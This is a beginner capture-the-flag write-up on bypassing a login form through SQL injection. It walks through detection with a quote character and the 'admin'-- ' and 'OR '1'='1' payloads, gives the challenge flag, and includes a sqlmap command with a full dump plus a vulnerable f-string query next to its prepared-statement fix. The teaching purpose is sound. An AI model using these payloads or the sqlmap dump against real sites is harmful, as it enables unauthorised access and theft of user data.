---
title: "SQL Injection in Login - WebCTF 2024"
description: "Exploit an SQL injection vulnerability in a login form to gain administrative access."
ctfName: "WebCTF 2024"
category: "web"
difficulty: "easy"
points: 150
pubDate: 2024-11-05
heroImage: "/images/ctf/default-ctf.png"
tags: ["web", "sql-injection", "authentication-bypass", "sqli"]
language: en
solves: 1456
author: "WebCTF Team"
skillLevel: "beginner"
estimatedTime: "30-45 minutes"
tools: ["burpsuite", "sqlmap", "browser-devtools"]
---

# SQL Injection in Login - WebCTF 2024

## Description

We are presented with a login form vulnerable to SQL injection. The goal is to bypass authentication and access as admin to obtain the flag.

## Reconnaissance

Upon accessing the site we find a simple form:

```html
<form method="POST" action="/login">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <button type="submit">Login</button>
</form>
```

## Initial Tests

We try with normal credentials:
- Username: `admin`
- Password: `password`

**Response**: "Invalid credentials"

## Detecting the Vulnerability

We test with a single quote in the username field:
```
Username: admin'
Password: password
```

**SQL Error**: `You have an error in your SQL syntax near ''admin''' at line 1`

The site is vulnerable to SQL Injection!

## Query Analysis

The query is probably:
```sql
SELECT * FROM users WHERE username='admin'' AND password='password'
```

## Exploitation

### Method 1: SQL Comments

We can comment out the rest of the query:

```
Username: admin'-- 
Password: anything
```

Resulting query:
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password='anything'
```

### Method 2: OR Logic

We can also use an always-true condition:

```
Username: admin' OR '1'='1
Password: anything
```

Resulting query:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

## Solution

Using the payload `admin'-- ` in the username field:

1. Intercept the request with Burp Suite (optional)
2. Submit the form with:
   - Username: `admin'-- `
   - Password: `test`
3. Access granted!

**Server response**:
```
Welcome, admin!
Flag: CTF{sql_1nj3ct10n_1s_d4ng3r0us}
```

## Prevention

To avoid this vulnerability:

```python
# ❌ Vulnerable
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# ✅ Safe - Prepared Statements
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

## Useful Commands

If we want to automate with SQLmap:

```bash
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 \
  --dump
```

## Flag

`CTF{sql_1nj3ct10n_1s_d4ng3r0us}`

## Lessons Learned

- ✅ Always validate user input
- ✅ Use prepared statements
- ✅ Sanitize special characters
- ✅ Implement WAF (Web Application Firewall)
